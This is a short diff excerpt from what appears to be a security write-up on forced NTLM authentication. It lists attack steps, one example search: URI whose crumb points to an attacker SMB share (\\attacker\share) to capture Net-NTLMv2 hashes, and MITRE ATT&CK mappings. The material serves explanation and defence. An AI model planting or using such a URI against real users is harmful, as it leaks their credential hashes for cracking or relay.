@@ -26,19 +26,13 @@ Attack Flow
 	4. Windows automatically attempts SMB authentication.
 	5. The attacker captures the victim's Net-NTLMv2 challenge-response.
 Example:
-
 search:query=test&crumb=location:\\attacker\share
 
 MITRE ATT&CK Mapping
-
 Technique	Description
-
 T1187	Forced Authentication
-
 T1557	Adversary-in-the-Middle
-
 T1110.002	Password Cracking
-
 T1021.002	SMB/Windows Admin Shares
 
 
